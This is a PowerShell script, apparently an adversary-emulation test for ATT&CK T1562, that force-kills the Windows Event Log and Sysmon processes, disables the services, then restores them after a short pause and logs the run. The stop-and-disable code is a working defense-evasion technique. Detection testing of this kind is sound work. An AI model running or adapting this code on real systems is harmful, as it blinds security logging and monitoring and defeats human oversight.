<#
    T1562.001 - Impair Defenses: Disable or Modify Tools
    T1562.002 - Impair Defenses: Disable Windows Event Logging
    T1562.003 - Impair Defenses: Impair Command History Logging
    Simple script to kill Windows Event Log services and Sysmon Services
#>

Start-Transcript -Path "$env:tmp\simulation_traces.log" -Append

$services = @('EventLog','Sysmon64','Sysmon')
foreach($svc in $services){
    try{
        $Service = Get-WmiObject -Class win32_service -Filter "Name = `'$svc`'"
        if($Service){
            # Stop Services
            if ((Get-Service $Service.Name).Status -eq "Running"){
                Stop-Process -Id $Service.ProcessId -Force -PassThru -ErrorAction Stop
            }
            Set-Service -Name $Service.Name -StartupType Disabled
            if ((Get-Service $Service.Name).Status -ne "Running"){
                Write-Host -ForegroundColor Green "Sucess: "$Service.Name"stopped"
                sleep 4
                # Undo Actions
                Set-Service -Name $service.Name -StartupType Automatic
                Start-Service -Name $service.Name
                if ((Get-Service $Service.Name).Status -eq "Running"){
                    Write-Host -ForegroundColor Green "Sucess: "$Service.Name"restarted" 
                }
                else{
                    Write-Host -ForegroundColor Red "Error: "$Service.Name"could not be restarted..." 
                }
            }
            else{
                Write-Host -ForegroundColor Red "Error: "$Service.Name" is still running..." 
            }
   
        }
        else{
            Write-Host -ForegroundColor Gray "Service $svc not found" 
        }

    }
    catch{
        Write-Host -ForegroundColor Red "Error: $_" 
    }
}

Stop-Transcript
